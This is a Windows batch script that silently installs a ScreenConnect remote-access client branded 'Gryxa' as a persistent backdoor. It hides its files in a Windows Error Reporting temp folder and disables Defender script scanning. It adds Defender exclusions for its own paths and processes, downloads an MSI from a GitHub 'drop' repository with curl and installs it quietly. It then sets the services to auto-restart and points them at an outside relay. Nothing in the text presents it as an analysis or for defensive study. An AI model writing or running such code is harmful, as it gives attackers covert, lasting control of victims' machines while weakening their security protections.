@echo off
rem OWN_GRYXA BUILD 20260804G4 - PowerShell-free Gryxa install (AMSI-proof fallback)
rem G4: when service ABSENT but dir/ARP stuck, /x Gryxa ProductCode only then /i (fixes 1603).
rem G3: NEVER /i while service exists; repo MSI only (no live ui.gryxa Upgrade MSI).
rem G2: NEVER msiexec /x when service exists or START_PENDING.
setlocal EnableExtensions EnableDelayedExpansion

set "WD=%~1"
if "%WD%"=="" set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "GRYXA_FP=%~2"
if "%GRYXA_FP%"=="" set "GRYXA_FP=36e506ff016b2151"
set "KEEP_FP=%~3"
if "%KEEP_FP%"=="" set "KEEP_FP=5f6010579852e507"
set "ALT_FP=%~4"
if "%ALT_FP%"=="" set "ALT_FP=f861c8140d453427"

set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "MSI=%STAGE%\pkg_gryxa.msi"
set "LOG=%WD%\own_gryxa.log"
set "LOCK=%WD%\gryxa_msi.lock"
set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
set "URL1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi"
set "SVC=ScreenConnect Client (%GRYXA_FP%)"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
echo [%DATE% %TIME%] own_gryxa G3 begin fp=%GRYXA_FP%>>"%LOG%"

if exist "%LOCK%" (
  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%LOCK%') -and (((Get-Date)-(Get-Item -LiteralPath '%LOCK%').LastWriteTime).TotalMinutes -lt 20)){exit 0}else{exit 1}" >nul 2>&1
  if not errorlevel 1 (
    echo [%DATE% %TIME%] lock_present skip>>"%LOG%"
    exit /b 0
  )
  del /f /q "%LOCK%" >nul 2>&1
)
echo %DATE% %TIME%>"%LOCK%"

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%STAGE%" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1

rem any live Gryxa FP → do nothing
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "_FP=%%a"
  set "_FP=!_FP: =!"
  if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
    sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
    if not errorlevel 1 (
      echo [%DATE% %TIME%] other_gryxa_alive fp=!_FP! skip>>"%LOG%"
      (
        echo CURRENT_FP=!_FP!
        echo RELAY=update.gryxa.com
        echo UI=ui.gryxa.com
        echo UPDATED=cmd-own_gryxa-adopt
      ) >"%WD%\gryxa.cfg"
      del /f /q "%LOCK%" >nul 2>&1
      exit /b 0
    )
  )
)

sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
if not errorlevel 1 (
  echo [%DATE% %TIME%] already_alive>>"%LOG%"
  del /f /q "%LOCK%" >nul 2>&1
  exit /b 0
)

rem service exists → start only, NEVER /i (reinstall interrupted live Guest)
sc query "%SVC%" >nul 2>&1
if not errorlevel 1 (
  echo [%DATE% %TIME%] svc_exists_start_only>>"%LOG%"
  sc config "%SVC%" start= auto >nul 2>&1
  sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
  sc start "%SVC%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
  if not errorlevel 1 (
    echo [%DATE% %TIME%] started_ok>>"%LOG%"
    del /f /q "%LOCK%" >nul 2>&1
    exit /b 0
  )
  echo [%DATE% %TIME%] start_failed_NO_reinstall_L44>>"%LOG%"
  del /f /q "%LOCK%" >nul 2>&1
  exit /b 1
)

set "NEED=1"
if exist "%MSI%" for %%F in ("%MSI%") do if %%~zF GTR 1000000 set "NEED=0"
if "%NEED%"=="1" (
  echo [%DATE% %TIME%] fetch %URL1%>>"%LOG%"
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 180 -o "%MSI%.tmp" "%URL1%" >>"%LOG%" 2>&1
  if exist "%MSI%.tmp" for %%F in ("%MSI%.tmp") do if %%~zF GTR 1000000 move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
)
if not exist "%MSI%" (
  echo [%DATE% %TIME%] msi_unavailable_no_url2>>"%LOG%"
  del /f /q "%LOCK%" >nul 2>&1
  exit /b 2
)

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1

rem G3/G4: /x ONLY when Gryxa service fully absent (1060). Needed for STUCK dir/ARP → else /i returns 1603.
sc query "%SVC%" >nul 2>&1
if errorlevel 1 (
  echo [%DATE% %TIME%] preclean_absent_x %PC%>>"%LOG%"
  msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
  reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
  reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
  if exist "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" (
    echo [%DATE% %TIME%] rmdir_stuck_pf86>>"%LOG%"
    rmdir /s /q "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
  )
  if exist "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)" (
    echo [%DATE% %TIME%] rmdir_stuck_pf>>"%LOG%"
    rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
  )
)

rem final race check — if svc appeared, do not /i
sc query "%SVC%" >nul 2>&1
if not errorlevel 1 (
  echo [%DATE% %TIME%] race_svc_appeared_abort_i>>"%LOG%"
  sc start "%SVC%" >nul 2>&1
  del /f /q "%LOCK%" >nul 2>&1
  exit /b 0
)

echo [%DATE% %TIME%] msiexec /i>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_gryxa_cmd.log"
set "MSIEXIT=!ERRORLEVEL!"
echo [%DATE% %TIME%] msiexec_exit=!MSIEXIT!>>"%LOG%"
echo !MSIEXIT!>"%WD%\gryxa_install.result"

sc config "%SVC%" start= auto >nul 2>&1
sc failure "%SVC%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%SVC%" >nul 2>&1
sc config "ScreenConnect Client (%KEEP_FP%)" start= auto >nul 2>&1
sc start "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
sc config "ScreenConnect Client (%ALT_FP%)" start= auto >nul 2>&1
sc start "ScreenConnect Client (%ALT_FP%)" >nul 2>&1

(
  echo CURRENT_FP=%GRYXA_FP%
  echo RELAY=update.gryxa.com
  echo UI=ui.gryxa.com
  echo UPDATED=cmd-own_gryxa-G3
) >"%WD%\gryxa.cfg"

sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
if not errorlevel 1 (
  echo [%DATE% %TIME%] running_ok>>"%LOG%"
  del /f /q "%LOCK%" >nul 2>&1
  exit /b 0
)
echo [%DATE% %TIME%] still_down msi_exit=!MSIEXIT!>>"%LOG%"
del /f /q "%LOCK%" >nul 2>&1
exit /b 1
